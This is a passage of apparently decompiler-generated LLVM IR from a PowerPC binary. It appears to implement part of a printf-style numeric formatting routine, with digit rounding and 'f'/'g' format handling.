  store i1 %v1_10009ea8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ea8, i1* %cr7_eq.global-to-local, align 1
  %v0_10009eb8 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10009ea8, label %dec_label_pc_10009eb8, label %dec_label_pc_10009eb0

dec_label_pc_10009eb0:                            ; preds = %dec_label_pc_10009ea8, %dec_label_pc_10009e98, %dec_label_pc_10009ea0
  %v0_10009eb0 = phi i32 [ 0, %dec_label_pc_10009e98 ], [ %v1_10009ea0, %dec_label_pc_10009ea0 ], [ %v0_10009eb8, %dec_label_pc_10009ea8 ]
  store i32 %v0_10009eb0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009edc

dec_label_pc_10009eb8:                            ; preds = %dec_label_pc_10009ea8
  %v1_10009eb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_10009eb8 = add i32 %v1_10009eb8, %v0_10009eb8
  store i32 %v2_10009eb8, i32* %r10.global-to-local, align 4
  %v1_10009ebc = icmp slt i32 %v2_10009eb8, -1
  %v3_10009ebc = icmp eq i32 %v2_10009eb8, -1
  store i1 %v1_10009ebc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009ebc, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10009eb8, -2
  br i1 %tmp77, label %dec_label_pc_10009edc, label %dec_label_pc_10009ec4

dec_label_pc_10009ec4:                            ; preds = %dec_label_pc_10009eb8
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10009ec8 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10009ec8, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268476116, i32* @lr, align 4
  %v3_10009ed0 = call i32 @function_10006e28(i32 %v2_10009ec8, i32 48, i32 17)
  store i32 %v3_10009ed0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009edc

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009eb8, %dec_label_pc_10009eb0, %dec_label_pc_10009ec4
  %v1_10009f00 = phi i32 [ %v2_10009eb8, %dec_label_pc_10009eb8 ], [ %v0_10009eb0, %dec_label_pc_10009eb0 ], [ -1, %dec_label_pc_10009ec4 ]
  %v1_10009edc = icmp slt i32 %v1_10009f00, 16
  %v2_10009edc = icmp sgt i32 %v1_10009f00, 16
  %v3_10009edc = icmp eq i32 %v1_10009f00, 16
  store i1 %v1_10009edc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009edc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10009ef0 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10009ef0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10009edc, label %dec_label_pc_10009f18, label %dec_label_pc_10009efc

dec_label_pc_10009efc:                            ; preds = %dec_label_pc_10009edc
  %v2_10009efc = ptrtoint i32* %stack_var_-177 to i32
  %v2_10009f00 = add i32 %v1_10009f00, %v2_10009efc
  store i32 %v2_10009f00, i32* %r9.global-to-local, align 4
  %v1_10009f04 = add i32 %v2_10009f00, 2
  %v2_10009f04 = inttoptr i32 %v1_10009f04 to i8*
  %v3_10009f04 = load i8, i8* %v2_10009f04, align 1
  %v4_10009f04 = zext i8 %v3_10009f04 to i32
  store i32 %v4_10009f04, i32* %r0.global-to-local, align 4
  store i32 %v1_10009f04, i32* %r11.global-to-local, align 4
  %v1_10009f0c = sub nsw i32 52, %v4_10009f04
  %v2_10009f0c = sub nuw nsw i32 -1, %v4_10009f04
  %not.v5_10009f0c = icmp ugt i32 %v1_10009f0c, %v2_10009f0c
  %v1_10009f14 = zext i1 %not.v5_10009f0c to i32
  store i32 %v1_10009f14, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009f18

dec_label_pc_10009f18:                            ; preds = %dec_label_pc_10009edc, %dec_label_pc_10009efc, %dec_label_pc_10009f18.backedge
  %v0_10009f1c = phi i32 [ %v0_10009f1c.pre, %dec_label_pc_10009f18.backedge ], [ 0, %dec_label_pc_10009edc ], [ %v1_10009f14, %dec_label_pc_10009efc ]
  %v0_10009f18 = phi i32 [ %v0_10009f18.pre, %dec_label_pc_10009f18.backedge ], [ %v2_10009ef0, %dec_label_pc_10009edc ], [ %v1_10009f04, %dec_label_pc_10009efc ]
  %v1_10009f18 = add i32 %v0_10009f18, -1
  %v2_10009f18 = inttoptr i32 %v1_10009f18 to i8*
  %v3_10009f18 = load i8, i8* %v2_10009f18, align 1
  %v4_10009f18 = zext i8 %v3_10009f18 to i32
  store i32 %v1_10009f18, i32* %r11.global-to-local, align 4
  %v2_10009f1c = add i32 %v4_10009f18, %v0_10009f1c
  store i32 %v2_10009f1c, i32* %r0.global-to-local, align 4
  %v1_10009f20 = urem i32 %v2_10009f1c, 256
  store i32 %v1_10009f20, i32* %r9.global-to-local, align 4
  %v1_10009f24 = trunc i32 %v2_10009f1c to i8
  store i8 %v1_10009f24, i8* %v2_10009f18, align 1
  %v0_10009f28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f28 = icmp slt i32 %v0_10009f28, 48
  %v3_10009f28 = icmp eq i32 %v0_10009f28, 48
  store i1 %v1_10009f28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f28, i1* %cr7_eq.global-to-local, align 1
  %v1_10009f2c = icmp ult i32 %v0_10009f28, 57
  %v2_10009f2c = icmp ugt i32 %v0_10009f28, 57
  %v3_10009f2c = icmp eq i32 %v0_10009f28, 57
  store i1 %v1_10009f2c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10009f2c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10009f2c, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10009f28, %v2_10009f2c
  br i1 %brmerge, label %dec_label_pc_10009f18.backedge, label %dec_label_pc_10009f38

dec_label_pc_10009f18.backedge:                   ; preds = %dec_label_pc_10009f18
  %v0_10009f18.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10009f1c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009f18

dec_label_pc_10009f38:                            ; preds = %dec_label_pc_10009f18
  %v2_10009f38 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10009f38, i32* %r0.global-to-local, align 4
  %v0_10009f3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10009f3c, i32* %r7.global-to-local, align 4
  %v0_10009f40 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009f40 = icmp ult i32 %v0_10009f40, %v2_10009f38
  %v3_10009f40 = icmp ugt i32 %v0_10009f40, %v2_10009f38
  %v4_10009f40 = icmp eq i32 %v0_10009f40, %v2_10009f38
  store i1 %v2_10009f40, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009f40, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10009dcc, i32* %r8.global-to-local, align 4
  br i1 %v3_10009f40, label %dec_label_pc_10009f58, label %dec_label_pc_10009f4c

dec_label_pc_10009f4c:                            ; preds = %dec_label_pc_10009f38
  store i32 %v2_10009f38, i32* %r8.global-to-local, align 4
  %v1_10009f50 = add i32 %v0_10009f3c, 1
  store i32 %v1_10009f50, i32* %r7.global-to-local, align 4
  store i32 %v2_10009f38, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009f58

dec_label_pc_10009f58:                            ; preds = %dec_label_pc_10009f38, %dec_label_pc_10009f4c
  %v2_10009f60 = phi i32 [ %v0_10009f40, %dec_label_pc_10009f38 ], [ %v2_10009f38, %dec_label_pc_10009f4c ]
  %v0_10009f58 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009f58 = icmp slt i32 %v0_10009f58, 103
  %v3_10009f58 = icmp eq i32 %v0_10009f58, 103
  store i1 %v1_10009f58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f58, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10009f60 = add i32 %v2_10009f60, 1
  %v4_10009f60 = inttoptr i32 %v3_10009f60 to i8*
  store i8 0, i8* %v4_10009f60, align 1
  %v0_10009f64 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009f64 = add i32 %v0_10009f64, 1
  store i32 %v1_10009f64, i32* %r9.global-to-local, align 4
  %v0_10009f68 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009f68, label %dec_label_pc_10009f6c, label %dec_label_pc_10009f90

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f58
  %v0_10009f6c = load i32, i32* %r7.global-to-local, align 4
  %v1_10009f6c = icmp slt i32 %v0_10009f6c, -4
  %v3_10009f6c = icmp eq i32 %v0_10009f6c, -4
  store i1 %v1_10009f6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10009f6c, label %dec_label_pc_10009f88, label %dec_label_pc_10009f74

dec_label_pc_10009f74:                            ; preds = %dec_label_pc_10009f6c
  %v1_10009f74 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009f74 = icmp sgt i32 %v1_10009f74, %v0_10009f6c
  %v3_10009f74 = icmp slt i32 %v1_10009f74, %v0_10009f6c
  %v4_10009f74 = icmp eq i32 %v1_10009f74, %v0_10009f6c
  store i1 %v2_10009f74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009f74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009f74, label %dec_label_pc_10009f88, label %dec_label_pc_10009f7c

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f74
  %v2_10009f7c = sub i32 %v1_10009f74, %v0_10009f6c
  store i32 %v2_10009f7c, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009fa8

dec_label_pc_10009f88:                            ; preds = %dec_label_pc_10009f74, %dec_label_pc_10009f6c
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_10009f90:                            ; preds = %dec_label_pc_10009f58
  %v0_10009f90 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009f90 = icmp slt i32 %v0_10009f90, 102
  %v3_10009f90 = icmp eq i32 %v0_10009f90, 102
  store i1 %v1_10009f90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009f90, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10009f90, i32* %r4.global-to-local, align 4
  br i1 %v3_10009f90, label %dec_label_pc_10009fa8thread-pre-split, label %dec_label_pc_10009f9c

dec_label_pc_10009f9c:                            ; preds = %dec_label_pc_10009f90, %dec_label_pc_10009f88
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fa8thread-pre-split:            ; preds = %dec_label_pc_10009f90
  %v0_10009fa8.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009fa8

dec_label_pc_10009fa8:                            ; preds = %dec_label_pc_10009fa8thread-pre-split, %dec_label_pc_10009f7c
  %v0_10009fac = phi i32 [ %v0_10009fa8.pr, %dec_label_pc_10009fa8thread-pre-split ], [ %v0_10009f6c, %dec_label_pc_10009f7c ]
  %v1_10009fa8 = icmp slt i32 %v0_10009fac, 0
  %v2_10009fa8 = icmp sgt i32 %v0_10009fac, 0
  %v3_10009fa8 = icmp eq i32 %v0_10009fac, 0
  store i1 %v1_10009fa8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10009fa8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10009fa8, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10009fac, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10009fac, -1
  br i1 %tmp78, label %dec_label_pc_10009fbc, label %dec_label_pc_10009fb4

dec_label_pc_10009fb4:                            ; preds = %dec_label_pc_10009fa8
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10009fb8 = load i32, i32* %r8.global-to-local, align 4
  %v3_10009fb8 = add i32 %v2_10009fb8, -1
  %v4_10009fb8 = inttoptr i32 %v3_10009fb8 to i8*
  store i8 48, i8* %v4_10009fb8, align 1
  store i32 %v3_10009fb8, i32* %r8.global-to-local, align 4
  %v1_10009fd8.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10009fec.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009fa8, %dec_label_pc_10009f9c, %dec_label_pc_10009fb4
  %v0_10009fec = phi i1 [ %v1_10009fa8, %dec_label_pc_10009fa8 ], [ false, %dec_label_pc_10009f9c ], [ %v0_10009fec.pre, %dec_label_pc_10009fb4 ]
  %v1_10009fd8 = phi i32 [ %v1_10009f64, %dec_label_pc_10009fa8 ], [ %v1_10009f64, %dec_label_pc_10009f9c ], [ %v1_10009fd8.pre, %dec_label_pc_10009fb4 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10009fc8 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10009fc8, i32* %r0.global-to-local, align 4
  %v0_10009fd0 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009fd0 = add i32 %v0_10009fd0, 1
  store i32 %v1_10009fd0, i32* %r6.global-to-local, align 4
  %v2_10009fd8 = sub i32 %v1_10009fd8, %v1_10009fd0
  store i32 %v2_10009fd8, i32* %r11.global-to-local, align 4
  %v1_10009fdc = inttoptr i32 %v0_10009fd0 to i8*
  %v2_10009fdc = load i8, i8* %v1_10009fdc, align 1
  %v3_10009fdc = zext i8 %v2_10009fdc to i32
  store i32 %v3_10009fdc, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10009fec, label %dec_label_pc_1000a04c, label %dec_label_pc_10009ff0

dec_label_pc_10009ff0:                            ; preds = %dec_label_pc_10009fbc
  %v0_10009ff0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009ff0 = icmp slt i32 %v0_10009ff0, %v2_10009fd8
  %v4_10009ff0 = icmp eq i32 %v0_10009ff0, %v2_10009fd8
  store i1 %v2_10009ff0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10009ff0, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10009ff0, label %dec_label_pc_1000a044, label %dec_label_pc_1000a004

dec_label_pc_1000a004:                            ; preds = %dec_label_pc_10009ff0
  %v2_1000a004 = sub i32 %v0_10009ff0, %v2_10009fd8
  store i32 %v2_1000a004, i32* %r0.global-to-local, align 4
  %v4_1000a004 = icmp sgt i32 %v2_1000a004, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a004, label %dec_label_pc_1000a020, label %dec_label_pc_1000a010

dec_label_pc_1000a010:                            ; preds = %dec_label_pc_1000a004
  %v2_1000a014 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a014, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a068

dec_label_pc_1000a020:                            ; preds = %dec_label_pc_1000a004
  store i32 ptrtoint (i32* @global_var_1000f2cb.292 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a02c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000a02c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000a068

dec_label_pc_1000a044:                            ; preds = %dec_label_pc_10009ff0
  %v0_1000a044 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000a044, label %dec_label_pc_1000a054, label %dec_label_pc_1000a048

dec_label_pc_1000a048:                            ; preds = %dec_label_pc_1000a044
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a04c

dec_label_pc_1000a04c:                            ; preds = %dec_label_pc_10009fbc, %dec_label_pc_1000a048
  %v2_1000a04c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a04c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a068

dec_label_pc_1000a054:                            ; preds = %dec_label_pc_1000a044
  %v2_1000a054 = sub i32 %v2_10009fd8, %v0_10009ff0
  store i32 %v2_1000a054, i32* %r11.global-to-local, align 4
  %v2_1000a05c = add i32 %v0_10009ff0, %v1_10009fd0
  store i32 %v2_1000a05c, i32* %r6.global-to-local, align 4
  %v2_1000a060 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a060, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a068

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a04c, %dec_label_pc_1000a020, %dec_label_pc_1000a010, %dec_label_pc_1000a054
  %v1_1000a094 = phi i32 [ %v2_1000a04c, %dec_label_pc_1000a04c ], [ %v2_1000a02c, %dec_label_pc_1000a020 ], [ %v2_1000a014, %dec_label_pc_1000a010 ], [ %v2_1000a060, %dec_label_pc_1000a054 ]
  %v0_1000a074 = phi i32 [ %v2_10009fd8, %dec_label_pc_1000a04c ], [ 0, %dec_label_pc_1000a020 ], [ 0, %dec_label_pc_1000a010 ], [ %v2_1000a054, %dec_label_pc_1000a054 ]
  %v3_1000a068 = load i32, i32* %v2_10009c38, align 4
  store i32 %v3_1000a068, i32* %r0.global-to-local, align 4
  %v1_1000a06c = and i32 %v3_1000a068, 16
  store i32 %v1_1000a06c, i32* %r9.global-to-local, align 4
  %v3_1000a06c = icmp eq i32 %v1_1000a06c, 0
  br i1 %v3_1000a06c, label %dec_label_pc_1000a074, label %dec_label_pc_1000a08c

dec_label_pc_1000a074:                            ; preds = %dec_label_pc_1000a068
  %v1_1000a074 = icmp slt i32 %v0_1000a074, 0
  %v3_1000a074 = icmp eq i32 %v0_1000a074, 0
  store i1 %v1_1000a074, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a074, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a074, label %dec_label_pc_1000a07c, label %dec_label_pc_1000a08c

dec_label_pc_1000a07c:                            ; preds = %dec_label_pc_1000a074
  %v0_1000a07c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a07c = icmp slt i32 %v0_1000a07c, 103
  %v3_1000a07c = icmp eq i32 %v0_1000a07c, 103
  store i1 %v1_1000a07c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a07c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a07c, label %dec_label_pc_1000a0ac, label %dec_label_pc_1000a084

dec_label_pc_1000a084:                            ; preds = %dec_label_pc_1000a07c
  %v0_1000a084 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a084 = icmp slt i32 %v0_1000a084, 0
  %v3_1000a084 = icmp eq i32 %v0_1000a084, 0
  store i1 %v1_1000a084, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a084, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000a084, 1
  br i1 %tmp79, label %dec_label_pc_1000a0ac, label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a074, %dec_label_pc_1000a068, %dec_label_pc_1000a084
  %v2_1000a094 = inttoptr i32 %v1_1000a094 to i32*
  store i32 112, i32* %v2_1000a094, align 4
  store i32 ptrtoint (i32* @global_var_1000f2d8.293 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000a0a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0a0 = add i32 %v1_1000a0a0, 8
  %v3_1000a0a0 = inttoptr i32 %v2_1000a0a0 to i32*
  store i32 ptrtoint (i32* @global_var_1000f2d8.293 to i32), i32* %v3_1000a0a0, align 4
  %v0_1000a0a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0a4 = add i32 %v1_1000a0a4, 4
  %v3_1000a0a4 = inttoptr i32 %v2_1000a0a4 to i32*
  store i32 %v0_1000a0a4, i32* %v3_1000a0a4, align 4
  %v0_1000a0a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0a8 = add i32 %v0_1000a0a8, 12
  store i32 %v1_1000a0a8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0ac

dec_label_pc_1000a0ac:                            ; preds = %dec_label_pc_1000a084, %dec_label_pc_1000a07c, %dec_label_pc_1000a08c
  %v1_1000a0bc = phi i32 [ %v1_1000a094, %dec_label_pc_1000a084 ], [ %v1_1000a094, %dec_label_pc_1000a07c ], [ %v1_1000a0a8, %dec_label_pc_1000a08c ]
  %v0_1000a0ac = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a0ac = add i32 %v0_1000a0ac, 1
  store i32 %v1_1000a0ac, i32* %r10.global-to-local, align 4
  %v4_1000a0ac = icmp eq i32 %v1_1000a0ac, 0
  br i1 %v4_1000a0ac, label %dec_label_pc_1000a0d4, label %dec_label_pc_1000a0b4

dec_label_pc_1000a0b4:                            ; preds = %dec_label_pc_1000a0ac
  %v1_1000a0b4 = sub i32 -1, %v0_1000a0ac
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a0bc = add i32 %v1_1000a0bc, 4
  %v3_1000a0bc = inttoptr i32 %v2_1000a0bc to i32*
  store i32 %v1_1000a0b4, i32* %v3_1000a0bc, align 4
  store i32 ptrtoint (i32* @global_var_1000f2cb.292 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a0c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0c8 = inttoptr i32 %v1_1000a0c8 to i32*
  store i32 %v0_1000a0c8, i32* %v2_1000a0c8, align 4
  %v0_1000a0cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a0cc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0cc = add i32 %v1_1000a0cc, 8
  %v3_1000a0cc = inttoptr i32 %v2_1000a0cc to i32*
  store i32 %v0_1000a0cc, i32* %v3_1000a0cc, align 4
  %v0_1000a0d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0d0 = add i32 %v0_1000a0d0, 12
  store i32 %v1_1000a0d0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0d4:                            ; preds = %dec_label_pc_1000a0ac, %dec_label_pc_1000a0b4
  %v1_1000a0e0 = phi i32 [ %v1_1000a0bc, %dec_label_pc_1000a0ac ], [ %v1_1000a0d0, %dec_label_pc_1000a0b4 ]
  %v0_1000a0d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a0d4 = icmp slt i32 %v0_1000a0d4, 0
  %v3_1000a0d4 = icmp eq i32 %v0_1000a0d4, 0
  store i1 %v1_1000a0d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0d4, label %dec_label_pc_1000a0f0, label %dec_label_pc_1000a0dc

dec_label_pc_1000a0dc:                            ; preds = %dec_label_pc_1000a0d4
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000a0e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a0e0 = add i32 %v1_1000a0e0, 8
  %v3_1000a0e0 = inttoptr i32 %v2_1000a0e0 to i32*
  store i32 %v0_1000a0e0, i32* %v3_1000a0e0, align 4
  %v0_1000a0e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a0e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0e4 = inttoptr i32 %v1_1000a0e4 to i32*
  store i32 %v0_1000a0e4, i32* %v2_1000a0e4, align 4
  %v0_1000a0e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a0e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0e8 = add i32 %v1_1000a0e8, 4
  %v3_1000a0e8 = inttoptr i32 %v2_1000a0e8 to i32*
  store i32 %v0_1000a0e8, i32* %v3_1000a0e8, align 4
  %v0_1000a0ec = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0ec = add i32 %v0_1000a0ec, 12
  store i32 %v1_1000a0ec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a0f0

dec_label_pc_1000a0f0:                            ; preds = %dec_label_pc_1000a0d4, %dec_label_pc_1000a0dc
  %v1_1000a118 = phi i32 [ %v1_1000a0e0, %dec_label_pc_1000a0d4 ], [ %v1_1000a0ec, %dec_label_pc_1000a0dc ]
  %v0_1000a0f0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a0f0 = icmp slt i32 %v0_1000a0f0, 103
  %v3_1000a0f0 = icmp eq i32 %v0_1000a0f0, 103
  store i1 %v1_1000a0f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0f0, label %dec_label_pc_1000a0f8, label %dec_label_pc_1000a104

dec_label_pc_1000a0f8:                            ; preds = %dec_label_pc_1000a0f0
  %v3_1000a0f8 = load i32, i32* %v2_10009c38, align 4
  store i32 %v3_1000a0f8, i32* %r0.global-to-local, align 4
  %v1_1000a0fc = and i32 %v3_1000a0f8, 16
  store i32 %v1_1000a0fc, i32* %r9.global-to-local, align 4
  %v3_1000a0fc = icmp eq i32 %v1_1000a0fc, 0
  br i1 %v3_1000a0fc, label %dec_label_pc_1000a130, label %dec_label_pc_1000a104

dec_label_pc_1000a104:                            ; preds = %dec_label_pc_1000a0f0, %dec_label_pc_1000a0f8
  %v0_1000a104 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a104 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a104 = sub i32 %v1_1000a104, %v0_1000a104
  store i32 %v2_1000a104, i32* %r9.global-to-local, align 4
  %v1_1000a108 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a108 = icmp sgt i32 %v1_1000a108, %v2_1000a104
  %v4_1000a108 = icmp eq i32 %v1_1000a108, %v2_1000a104
  store i1 %v2_1000a108, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a108, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a108, label %dec_label_pc_1000a110, label %dec_label_pc_1000a130

dec_label_pc_1000a110:                            ; preds = %dec_label_pc_1000a104
  %v2_1000a110 = sub i32 %v1_1000a108, %v2_1000a104
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a118 = add i32 %v1_1000a118, 4
  %v3_1000a118 = inttoptr i32 %v2_1000a118 to i32*
  store i32 %v2_1000a110, i32* %v3_1000a118, align 4
  store i32 ptrtoint (i32* @global_var_1000f2cb.292 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a124 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a124 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a124 = inttoptr i32 %v1_1000a124 to i32*
  store i32 %v0_1000a124, i32* %v2_1000a124, align 4
  %v0_1000a128 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a128 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a128 = add i32 %v1_1000a128, 8
  %v3_1000a128 = inttoptr i32 %v2_1000a128 to i32*
  store i32 %v0_1000a128, i32* %v3_1000a128, align 4
  %v0_1000a12c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a12c = add i32 %v0_1000a12c, 12
  store i32 %v1_1000a12c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a130

dec_label_pc_1000a130:                            ; preds = %dec_label_pc_1000a104, %dec_label_pc_1000a0f8, %dec_label_pc_1000a110
  %v1_1000a1c437 = phi i32 [ %v1_1000a118, %dec_label_pc_1000a104 ], [ %v1_1000a118, %dec_label_pc_1000a0f8 ], [ %v1_1000a12c, %dec_label_pc_1000a110 ]
  %v0_1000a130 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a130 = icmp slt i32 %v0_1000a130, 102
  %v3_1000a130 = icmp eq i32 %v0_1000a130, 102
  store i1 %v1_1000a130, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a130, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a130, label %dec_label_pc_1000a1b8, label %dec_label_pc_1000a138

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a130
  %v0_1000a138 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a138 = icmp slt i32 %v0_1000a138, 0
  %v3_1000a138 = icmp eq i32 %v0_1000a138, 0
  store i1 %v1_1000a138, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a138, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a138, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000a138, -1
  br i1 %tmp80, label %dec_label_pc_1000a154, label %dec_label_pc_1000a14c

dec_label_pc_1000a14c:                            ; preds = %dec_label_pc_1000a138
  %v1_1000a14c = sub i32 0, %v0_1000a138
